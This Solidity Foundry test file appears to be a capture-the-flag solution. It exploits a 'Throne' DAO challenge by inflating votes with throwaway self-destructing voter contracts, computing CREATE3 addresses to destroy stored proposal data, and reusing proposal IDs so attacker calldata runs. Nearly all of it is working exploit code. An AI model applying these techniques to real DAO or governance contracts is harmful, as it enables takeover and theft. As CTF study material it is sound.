// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Throne} from "../src/Throne.sol";
import {DAO} from "../src/DAO.sol";

contract Voter {
    constructor(
        DAO dao,
        uint256 id
    ) {
        dao.vote(id);
        assembly {
            selfdestruct(0)
        }
    }
}

bytes32 constant SLOT_KEY_PREFIX = 0x06fccbac10f612a9037c3e903b4f4bd03ffbc103781cbe821d25b33299e50efb;
bytes32 constant KECCAK256_PROXY_CHILD_BYTECODE = 0x648b59bcbb41c37892d3b820522dc8b8c275316bb020f043a9068f607abeb810;

function addressOf(address addr, bytes32 _salt) pure returns (address) {
    address proxy = address(
      uint160(
        uint256(
          keccak256(
            abi.encodePacked(
              hex'ff',
              addr,
              _salt,
              KECCAK256_PROXY_CHILD_BYTECODE
            )
          )
        )
      )
    );

    address c = address(
        uint160(
            uint256(
            keccak256(
                abi.encodePacked(
                hex"d6_94",
                proxy,
                hex"01"
                )
            )
            )
        )
    );
    return c;
}

function internalKey(bytes32 _key) pure returns (bytes32) {
    // Mutate the key so it doesn't collide
    // if the contract is also using CREATE3 for other things
    return keccak256(abi.encode(SLOT_KEY_PREFIX, _key));
}

contract Solver {
    uint256 constant REQUIRED_VOTES = 3;

    Throne immutable throne;
    DAO immutable dao;
    address immutable solver;
    uint256 immutable solution;

    constructor(Throne _throne, address _solver) {
        throne = _throne;
        dao = throne.dao();
        solver = _solver;
        solution = uint256(keccak256(abi.encode(solver)));
    }

    function createIds(uint256 seed, uint256 count) internal pure returns (uint256[] memory result) {
        result = new uint256[](count);
        for (uint256 i = 0; i < count; i++) {
            seed = uint256(keccak256(abi.encode(seed, seed)));
            result[i] = seed;
        }
    }

    function doVotes(uint256 id) internal {
        for (uint256 i = 0; i < REQUIRED_VOTES-1; i++) {
            new Voter(dao, id);
        }
    }

    function stage1() public {
        uint256[] memory ids = createIds(uint256(keccak256("ChainLight")), 4);

        dao.createProposal(
            ids[3],
            address(throne),
            abi.encodeWithSelector(Throne.forgeThrone.selector, solution),
            ""
        );
        doVotes(ids[3]);
        dao.execute(ids[3]);

        // create data which can be selfdestructed
        bytes memory data = hex"6d2cd7810000000000000000000000ff";
        dao.createProposal(ids[1], address(throne), data, "");

        address dataAddress = addressOf(address(dao), internalKey(bytes32(ids[1])));

        // selfdestruct the data
        (bool success, ) = address(dataAddress).call("");
        require(success);
    }

    function stage2() public {
        uint256[] memory ids = createIds(uint256(keccak256("ChainLight")), 4);

        bytes memory desc = abi.encodeWithSelector(Throne.addUsurper.selector, solver);
        bytes memory data = abi.encodeWithSelector(Throne.forgeThrone.selector);
        dao.createProposal(ids[0], address(throne), data, string(desc));

        doVotes(ids[1]);
        dao.execute(ids[1]);
    }
}

contract Solve is Test {
    Throne throne;
    Solver solver;

    function setUp() public {
        throne = Throne(0x6d353b5FB19d63791FAf8a2e4B5Fa8D32519a8A3);//new Throne();
        stage1();
    }

    function stage1() public {
        address me = 0xB49bf876BE26435b6fae1Ef42C3c82c5867Fa149;
        solver = new Solver(throne, me);
        solver.stage1();
    }

    function stage2() public {
        address me = 0xB49bf876BE26435b6fae1Ef42C3c82c5867Fa149;
        solver.stage2();
        require(throne.verify(throne.generate(me), uint256(keccak256(abi.encode(me)))), "not solved");
    }

    function test() public {
        stage2();
    }
}
